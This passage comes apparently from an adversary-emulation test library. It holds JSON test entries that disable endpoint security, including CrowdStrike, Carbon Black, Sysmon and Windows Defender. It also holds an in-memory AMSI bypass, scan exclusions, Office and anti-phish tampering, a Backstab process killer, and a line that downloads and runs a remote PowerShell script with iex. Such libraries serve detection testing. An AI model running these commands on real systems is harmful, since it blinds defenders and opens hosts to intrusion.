systemctl stop cbdaemon\n  systemctl disable cbdaemon\nfi\n", "name": "sh"}}, {"name": "Disable SELinux", "auto_generated_guid": "fc225f36-9279-4c39-b3f9-5141ab74f8d8", "description": "Disables SELinux enforcement\n", "supported_platforms": ["linux"], "dependencies": [{"description": "SELinux must be installed\n", "prereq_command": "which setenforce\n", "get_prereq_command": "echo \"SELinux is not installed\"; exit 1\n"}], "executor": {"command": "setenforce 0\n", "cleanup_command": "setenforce 1\n", "name": "sh", "elevation_required": true}}, {"name": "Stop Crowdstrike Falcon on Linux", "auto_generated_guid": "828a1278-81cc-4802-96ab-188bf29ca77d", "description": "Stop and disable Crowdstrike Falcon on Linux\n", "supported_platforms": ["linux"], "executor": {"command": "sudo systemctl stop falcon-sensor.service\nsudo systemctl disable falcon-sensor.service\n", "cleanup_command": "sudo systemctl enable falcon-sensor.service\nsudo systemctl start falcon-sensor.service\n", "name": "sh", "elevation_required": true}}, {"name": "Disable Carbon Black Response", "auto_generated_guid": "8fba7766-2d11-4b4a-979a-1e3d9cc9a88c", "description": "Disables Carbon Black Response\n", "supported_platforms": ["macos"], "executor": {"command": "sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist\nsudo launchctl unload /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist\n", "cleanup_command": "sudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.daemon.plist\nsudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist\n", "name": "sh", "elevation_required": true}}, {"name": "Disable LittleSnitch", "auto_generated_guid": "62155dd8-bb3d-4f32-b31c-6532ff3ac6a3", "description": "Disables LittleSnitch\n", "supported_platforms": ["macos"], "executor": {"command": "sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist\n", "cleanup_command": "sudo launchctl load -w /Library/LaunchDaemons/at.obdev.littlesnitchd.plist\n", "name": "sh", "elevation_required": true}}, {"name": "Disable OpenDNS Umbrella", "auto_generated_guid": "07f43b33-1e15-4e99-be70-bc094157c849", "description": "Disables OpenDNS Umbrella\n", "supported_platforms": ["macos"], "executor": {"command": "sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\n", "cleanup_command": "sudo launchctl load -w /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\n", "name": "sh", "elevation_required": true}}, {"name": "Disable macOS Gatekeeper", "auto_generated_guid": "2a821573-fb3f-4e71-92c3-daac7432f053", "description": "Disables macOS Gatekeeper\n", "supported_platforms": ["macos"], "executor": {"command": "sudo spctl --master-disable\n", "cleanup_command": "sudo spctl --master-enable\n", "name": "sh", "elevation_required": true}}, {"name": "Stop and unload Crowdstrike Falcon on macOS", "auto_generated_guid": "b3e7510c-2d4c-4249-a33f-591a2bc83eef", "description": "Stop and unload Crowdstrike Falcon daemons falcond and userdaemon on macOS\n", "supported_platforms": ["macos"], "input_arguments": {"falcond_plist": {"description": "The path of the Crowdstrike Falcon plist file", "type": "path", "default": "/Library/LaunchDaemons/com.crowdstrike.falcond.plist"}, "userdaemon_plist": {"description": "The path of the Crowdstrike Userdaemon plist file", "type": "path", "default": "/Library/LaunchDaemons/com.crowdstrike.userdaemon.plist"}}, "executor": {"command": "sudo launchctl unload #{falcond_plist}\nsudo launchctl unload #{userdaemon_plist}\n", "cleanup_command": "sudo launchctl load -w #{falcond_plist}\nsudo launchctl load -w #{userdaemon_plist}\n", "name": "sh", "elevation_required": true}}, {"name": "Unload Sysmon Filter Driver", "auto_generated_guid": "811b3e76-c41b-430c-ac0d-e2380bfaa164", "description": "Unloads the Sysinternals Sysmon filter driver without stopping the Sysmon service. To verify successful execution, o verify successful execution,\nrun the prereq_command's and it should fail with an error of \"sysmon filter must be loaded\".\n", "supported_platforms": ["windows"], "input_arguments": {"sysmon_driver": {"description": "The name of the Sysmon filter driver (this can change from the default)", "type": "string", "default": "SysmonDrv"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Sysmon must be downloaded\n", "prereq_command": "if (-not (cmd.exe /c \"where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul\") -or (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\")) { exit 0 } else { exit 1 }\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/Sysmon.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\" -Force\n"}, {"description": "sysmon must be Installed\n", "prereq_command": "if(sc.exe query sysmon | findstr sysmon) { exit 0 } else { exit 1 }\n", "get_prereq_command": "if(cmd.exe /c \"where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul\") { C:\\Windows\\Sysmon.exe -accepteula -i } else\n{ & \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -accepteula -i}\n"}, {"description": "sysmon filter must be loaded\n", "prereq_command": "if(fltmc.exe filters | findstr #{sysmon_driver}) { exit 0 } else { exit 1 }\n", "get_prereq_command": "if(Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\"){\n  & \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -u\n  & \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -accepteula -i\n}else{\n  sysmon -u\n  sysmon -accepteula -i\n}\n"}], "executor": {"command": "fltmc.exe unload #{sysmon_driver}\n", "cleanup_command": "sysmon -u -i > nul 2>&1\nsysmon -i -accepteula -i > nul 2>&1\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -u > nul 2>&1\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -accepteula -i > nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Uninstall Sysmon", "auto_generated_guid": "a316fb2e-5344-470d-91c1-23e15c374edc", "description": "Uninstall Sysinternals Sysmon for Defense Evasion\n", "supported_platforms": ["windows"], "input_arguments": {"sysmon_exe": {"description": "The location of the Sysmon executable from Sysinternals (ignored if sysmon.exe is found in your PATH)", "type": "path", "default": "PathToAtomicsFolder\\T1562.001\\bin\\sysmon.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Sysmon executable must be available\n", "prereq_command": "if(cmd /c where sysmon) {exit 0} else {exit 1}\n", "get_prereq_command": "$parentpath = Split-Path \"#{sysmon_exe}\"; $zippath = \"$parentpath\\Sysmon.zip\"\nNew-Item -ItemType Directory $parentpath -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/Sysmon.zip\" -OutFile \"$zippath\"\nExpand-Archive $zippath $parentpath -Force; Remove-Item $zippath\nif(-not ($Env:Path).contains($parentpath)){$Env:Path += \";$parentpath\"}\n"}, {"description": "Sysmon must be installed\n", "prereq_command": "if(cmd /c sc query sysmon) { exit 0} else { exit 1}\n", "get_prereq_command": "cmd /c sysmon -i -accepteula\n"}], "executor": {"command": "sysmon -u\n", "cleanup_command": "sysmon -i -accepteula >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "AMSI Bypass - AMSI InitFailed", "auto_generated_guid": "695eed40-e949-40e5-b306-b4031e4154bd", "description": "Any easy way to bypass AMSI inspection is it patch the dll in memory setting the \"amsiInitFailed\" function to true.\nUpon execution, no output is displayed.\n\nhttps://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\n", "supported_platforms": ["windows"], "executor": {"command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n", "cleanup_command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)\n", "name": "powershell"}}, {"name": "AMSI Bypass - Remove AMSI Provider Reg Key", "auto_generated_guid": "13f09b91-c953-438e-845b-b585e51cac9b", "description": "With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\\Software\\Microsoft\\AMSI to disable AMSI inspection.\nThis test removes the Windows Defender provider registry key. Upon execution, no output is displayed.\nOpen Registry Editor and navigate to \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\\" to verify that it is gone.\n", "supported_platforms": ["windows"], "executor": {"command": "Remove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Recurse\n", "cleanup_command": "New-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\" -Name \"{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -ErrorAction Ignore | Out-Null\n", "name": "powershell", "elevation_required": true}}, {"name": "Disable Arbitrary Security Windows Service", "auto_generated_guid": "a1230893-56ac-4c81-b644-2108e982f8f5", "description": "With administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed.\nChange the service_name input argument for your AV solution. Upon exeuction, infomration will be displayed stating the status of the service.\nTo verify that the service has stopped, run \"sc query McAfeeDLPAgentService\"\n", "supported_platforms": ["windows"], "input_arguments": {"service_name": {"description": "The name of the service to stop", "type": "string", "default": "McAfeeDLPAgentService"}}, "executor": {"command": "net.exe stop #{service_name}\nsc.exe config #{service_name} start= disabled\n", "cleanup_command": "sc.exe config #{service_name} start= auto >nul 2>&1\nnet.exe start #{service_name} >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Tamper with Windows Defender ATP PowerShell", "auto_generated_guid": "6b8df440-51ec-4d53-bf83-899591c9b5d7", "description": "Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n", "supported_platforms": ["windows"], "executor": {"command": "Set-MpPreference -DisableRealtimeMonitoring 1\nSet-MpPreference -DisableBehaviorMonitoring 1\nSet-MpPreference -DisableScriptScanning 1\nSet-MpPreference -DisableBlockAtFirstSeen 1\n", "cleanup_command": "Set-MpPreference -DisableRealtimeMonitoring 0\nSet-MpPreference -DisableBehaviorMonitoring 0\nSet-MpPreference -DisableScriptScanning 0\nSet-MpPreference -DisableBlockAtFirstSeen 0\n", "name": "powershell", "elevation_required": true}}, {"name": "Tamper with Windows Defender Command Prompt", "auto_generated_guid": "aa875ed4-8935-47e2-b2c5-6ec00ab220d2", "description": "Attempting to disable scheduled scanning and other parts of windows defender atp. These commands must be run as System, so they still fail as administrator.\nHowever, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on. Upon execution, \"Access Denied\"\nwill be displayed twice and the WinDefend service status will be displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "sc stop WinDefend\nsc config WinDefend start=disabled\nsc query WinDefend\n", "cleanup_command": "sc start WinDefend >nul 2>&1\nsc config WinDefend start=enabled >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Tamper with Windows Defender Registry", "auto_generated_guid": "1b3e0146-a1e5-4c5c-89fb-1bb2ffe8fc45", "description": "Disable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be\ngrayed out and have no info.\n", "supported_platforms": ["windows"], "executor": {"command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1\n", "cleanup_command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 0\n", "name": "powershell", "elevation_required": true}}, {"name": "Disable Microsoft Office Security Features", "auto_generated_guid": "6f5fb61b-4e56-4a3d-a8c3-82e13686c6d7", "description": "Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not\nshow any warning before editing the document.\n\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n", "supported_platforms": ["windows"], "executor": {"command": "New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableInternetFilesInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableUnsafeLocationsInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableAttachementsInPV\" -Value \"1\" -PropertyType \"Dword\"\n", "cleanup_command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -ErrorAction Ignore | Out-Null\nRemove-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Remove Windows Defender Definition Files", "auto_generated_guid": "3d47daaa-2f56-43e0-94cc-caf5d8d52a68", "description": "Removing definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments.\nOn later viersions of windows (1909+) this command fails even with admin due to inusfficient privelages. On older versions of windows the\ncommand will say completed.\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n", "supported_platforms": ["windows"], "executor": {"command": "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Stop and Remove Arbitrary Security Windows Service", "auto_generated_guid": "ae753dda-0f15-4af6-a168-b9ba16143143", "description": "Beginning with Powershell 6.0, the Stop-Service cmdlet sends a stop message to the Windows Service Controller for each of the specified services. The Remove-Service cmdlet removes a Windows service in the registry and in the service database.\n", "supported_platforms": ["windows"], "input_arguments": {"service_name": {"description": "The name of the service to remove", "type": "string", "default": "McAfeeDLPAgentService"}}, "executor": {"command": "Stop-Service -Name #{service_name}\nRemove-Service -Name #{service_name}\n", "name": "powershell", "elevation_required": true}}, {"name": "Uninstall Crowdstrike Falcon on Windows", "auto_generated_guid": "b32b1ccf-f7c1-49bc-9ddd-7d7466a7b297", "description": "Uninstall Crowdstrike Falcon. If the WindowsSensor.exe path is not provided as an argument we need to search for it. Since the executable is located in a folder named with a random guid we need to identify it before invoking the uninstaller.\n", "supported_platforms": ["windows"], "input_arguments": {"falcond_path": {"description": "The Crowdstrike Windows Sensor path. The Guid always changes.", "type": "path", "default": "C:\\ProgramData\\Package Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe"}}, "executor": {"command": "if (Test-Path \"#{falcond_path}\") {. \"#{falcond_path}\" /repair /uninstall /quiet } else { Get-ChildItem -Path \"C:\\ProgramData\\Package Cache\" -Include \"WindowsSensor.exe\" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq \"Valid\" -and $sig.SignerCertificate.DnsNameList -eq \"CrowdStrike, Inc.\") { . \"$_\" /repair /uninstall /quiet; break;}}}", "name": "powershell", "elevation_required": true}}, {"name": "Tamper with Windows Defender Evade Scanning -Folder", "auto_generated_guid": "0b19f4ee-de90-4059-88cb-63c800c683ed", "description": "Malware can exclude a specific path from being scanned and evading detection. \nUpon successul execution, the file provided should be on the list of excluded path. \nTo check the exclusion list using poweshell (Get-MpPreference).ExclusionPath \n", "supported_platforms": ["windows"], "input_arguments": {"excluded_folder": {"description": "This folder will be excluded from scanning", "type": "path", "default": "C:\\Temp"}}, "executor": {"command": "$excludedpath= \"#{excluded_folder}\"\nAdd-MpPreference -ExclusionPath $excludedpath", "cleanup_command": "$excludedpath= \"#{excluded_folder}\"\nRemove-MpPreference -ExclusionPath $excludedpath\n", "name": "powershell", "elevation_required": true}}, {"name": "Tamper with Windows Defender Evade Scanning -Extension", "auto_generated_guid": "315f4be6-2240-4552-b3e1-d1047f5eecea", "description": "Malware can exclude specific extensions from being scanned and evading detection. \nUpon successful execution, the extension(s) should be on the list of excluded extensions.\nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionExtension.\n", "supported_platforms": ["windows"], "input_arguments": {"excluded_exts": {"description": "A list of extension to exclude from scanning", "type": "string", "default": ".exe"}}, "executor": {"command": "$excludedExts= \"#{excluded_exts}\"\nAdd-MpPreference -ExclusionExtension  $excludedExts", "cleanup_command": "$excludedExts= \"#{excluded_exts}\"\nRemove-MpPreference -ExclusionExtension  $excludedExts -ErrorAction Ignore\n", "name": "powershell", "elevation_required": true}}, {"name": "Tamper with Windows Defender Evade Scanning -Process", "auto_generated_guid": "a123ce6a-3916-45d6-ba9c-7d4081315c27", "description": "Malware can exclude specific processes from being scanned and evading detection.\nUpon successful execution, the process(es) should be on the list of excluded processes. \nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionProcess.\"\n", "supported_platforms": ["windows"], "input_arguments": {"excluded_process": {"description": "A list of processes to exclude from scanning", "type": "string", "default": "outlook.exe"}}, "executor": {"command": "$excludedProcess = \"#{excluded_process}\"\nAdd-MpPreference -ExclusionProcess $excludedProcess", "cleanup_command": "$excludedProcess = \"#{excluded_process}\"\nRemove-MpPreference -ExclusionProcess  $excludedProcess\n", "name": "powershell", "elevation_required": true}}, {"name": "office-365-Disable-AntiPhishRule", "auto_generated_guid": "b9bbae2c-2ba6-4cf3-b452-8e8f908696f3", "description": "Using the Disable-AntiPhishRule cmdlet to disable antiphish rules in your office-365 organization.\n", "supported_platforms": ["office-365"], "input_arguments": {"username": {"description": "office-365 username", "type": "string", "default": null}, "password": {"description": "office-365 password", "type": "string", "default": null}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "ExchangeOnlineManagement PowerShell module must be installed\n", "prereq_command": "$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}\n", "get_prereq_command": "Install-Module -Name ExchangeOnlineManagement\nImport-Module ExchangeOnlineManagement\n"}], "executor": {"command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\n$test = Get-AntiPhishRule\nDisable-AntiPhishRule -Identity $test.Name -Confirm:$false\nGet-AntiPhishRule\n", "cleanup_command": "if(\"#{password}\" -ne \"\") {\n$secure_pwd = (\"#{password}\" + \"\") | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\n$test = Get-AntiPhishRule\nEnable-AntiPhishRule -Identity $test.Name -Confirm:$false\nGet-AntiPhishRule\n} \n", "name": "powershell", "elevation_required": false}}, {"name": "Disable Windows Defender with DISM", "auto_generated_guid": "871438ac-7d6e-432a-b27d-3e7db69faf58", "description": "The following Atomic will attempt to disable Windows-Defender using the built in DISM.exe, Deployment Image Servicing and Management tool. \nDISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.\nThis method will remove Defender and it's package.\n", "supported_platforms": ["windows"], "executor": {"command": "Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet", "name": "command_prompt", "elevation_required": true}}, {"name": "Disable Defender Using NirSoft AdvancedRun", "auto_generated_guid": "81ce22fd-9612-4154-918e-8a1f285d214d", "description": "Information on NirSoft AdvancedRun and its creators found here: http://www.nirsoft.net/utils/advanced_run.html\nThis Atomic will run AdvancedRun.exe with similar behavior identified during the WhisperGate campaign.\nSee https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3\nUpon successful execution, AdvancedRun.exe will attempt to run and stop Defender, and optionally attempt to delete the Defender folder on disk. \n", "supported_platforms": ["windows"], "input_arguments": {"AdvancedRun_Location": {"description": "Path of Advanced Run executable", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\AdvancedRun.exe"}, "delete_defender_folder": {"description": "Set to 1 to also delete the Windows Defender folder", "type": "integer", "default": 0}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Advancedrun.exe must exist at #{AdvancedRun_Location}\n", "prereq_command": "if(Test-Path -Path \"#{AdvancedRun_Location}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"http://www.nirsoft.net/utils/advancedrun.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\advancedrun.zip\"\nExpand-Archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\advancedrun.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -Force\n"}], "executor": {"command": "Try {cmd /c \"#{AdvancedRun_Location}\" /EXEFilename \"$env:systemroot\\System32\\sc.exe\" /WindowState 0 /CommandLine \"stop WinDefend\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\nif(#{delete_defender_folder}){\n  $CommandToRun = rmdir \"$env:programdata\\Microsoft\\Windows Defender\" -Recurse\n  Try {cmd /c \"#{AdvancedRun_Location}\" /EXEFilename \"$env:systemroot\\System32\\WindowsPowershell\\v1.0\\powershell.exe\" /WindowState 0 /CommandLine \"$CommandToRun\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\n}\n", "cleanup_command": "Try {cmd /c \"#{AdvancedRun_Location}\" /EXEFilename \"$env:systemroot\\System32\\sc.exe\" /WindowState 0 /CommandLine \"start WinDefend\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\n", "name": "powershell", "elevation_required": true}}, {"name": "Kill antimalware protected processes using Backstab", "auto_generated_guid": "24a12b91-05a7-4deb-8d7f-035fa98591bc", "description": "Backstab loads Process Explorer driver which is signed by Microsoft and use it to terminate running processes protected by antimalware software such as MsSense.exe or MsMpEng.exe, which is otherwise not possible to kill.\nhttps://github.com/Yaxser/Backstab", "supported_platforms": ["windows"], "input_arguments": {"process_name": {"description": "Name of the protected process you want to kill/terminate.", "type": "string", "default": "MsMpEng.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Backstab64.exe should exist in ExtrnalPayloads Directory", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Backstab64.exe\") {exit 0} else {exit 1}", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/Yaxser/Backstab/releases/download/v1.0.1-beta/Backstab64.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Backstab64.exe\"\n"}], "executor": {"command": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\Backstab64.exe\" -k -n #{process_name}\n", "name": "powershell", "elevation_required": true}}, {"name": "WinPwn - Kill the event log services for stealth", "auto_generated_guid": "7869d7a3-3a30-4d2c-a5d2-f1cd9c34ce66", "description": "Kill the event log services for stealth via function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ninv-phantom -consoleoutput -noninteractive  ", "name": "powershell"}}, {"name": "Tamper with Windows Defender ATP using Aliases - PowerShell", "auto_generated_guid": "c531aa6e-9c97-4b29-afee-9b7be6fc8a64", "description": "Attempting to disable scheduled scanning and other parts of Windows Defender ATP using set-MpPreference aliases. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n", "supported_platforms": ["windows"], "executor": {"command": "Set-MpPreference -drtm $True\nSet-MpPreference -dbm $True\nSet-MpPreference -dscrptsc $True\nSet-MpPreference -dbaf $True\n", "cleanup_command": "Set-MpPreference -drtm 0\nSet-MpPreference -dbm 0\nSet-MpPreference -dscrptsc 0\nSet-MpPreference -dbaf 0\n", "name": "powershell", "elevation_required": true}}, {"name": "LockBit Black - Disable Privacy Settings Experience Using Registry -cmd", "auto_generated_guid": "d6d22332-d07d-498f-aea0-6139ecb7850e", "description": "LockBit Black - Disable Privacy Settings Experience Using Registry\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKCU\\Software\\Policies\\Microsoft\\Windows\\OOBE\" /v DisablePrivacyExperience /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg delete \"HKCU\\Software\\Policies\\Microsoft\\Windows\\OOBE\" /v DisablePrivacyExperience /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "LockBit Black - Use Registry Editor to turn on automatic logon -cmd", "auto_generated_guid": "9719d0e1-4fe0-4b2e-9a72-7ad3ee8ddc70", "description": "LockBit Black - Use Registry Editor to turn on automatic logon\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /t REG_DWORD /d 1 /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /t REG_SZ /d Administrator /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultDomainName /t REG_SZ /d contoso.com /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword /t REG_SZ /d password1 /f\n", "cleanup_command": "reg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /f >nul 2>&1\nreg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /f >nul 2>&1\nreg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultDomainName /f >nul 2>&1\nreg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "LockBit Black - Disable Privacy Settings Experience Using Registry -Powershell", "auto_generated_guid": "d8c57eaa-497a-4a08-961e-bd5efd7c9374", "description": "LockBit Black - Disable Privacy Settings Experience Using Registry\n", "supported_platforms": ["windows"], "executor": {"command": "New-ItemProperty \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE\" -Name DisablePrivacyExperience -PropertyType DWord -Value 1 -Force\n", "cleanup_command": "Remove-ItemProperty \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE\" -Name DisablePrivacyExperience -Force -ErrorAction Ignore\n", "name": "powershell", "elevation_required": true}}, {"name": "Lockbit Black - Use Registry Editor to turn on automatic logon -Powershell", "auto_generated_guid": "5e27f36d-5132-4537-b43b-413b0d5eec9a", "description": "Lockbit Black - Use Registry Editor to turn on automatic logon\n", "supported_platforms": ["windows"], "executor": {"command": "New-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name AutoAdminLogon -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultUserName -Value Administrator -Force\nNew-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultDomainName -Value contoso.com -Force\nNew-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultPassword  -Value password1 -Force\n", "cleanup_command": "Remove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name AutoAdminLogon -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultUserName -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultDomainName -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultPassword -Force -ErrorAction Ignore\n", "name": "powershell", "elevation_required": true}}, {"name": "Disable Windows Defender with PwSh Disable-WindowsOptionalFeature", "auto_generated_guid": "f542ffd3-37b4-4528-837f-682874faa012", "description": "The following Atomic will attempt to disable Windows-Defender using the built in PowerShell cmdlet Disable-WindowsOptionalFeature, Deployment Image Servicing and Management tool. \nSimilar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity 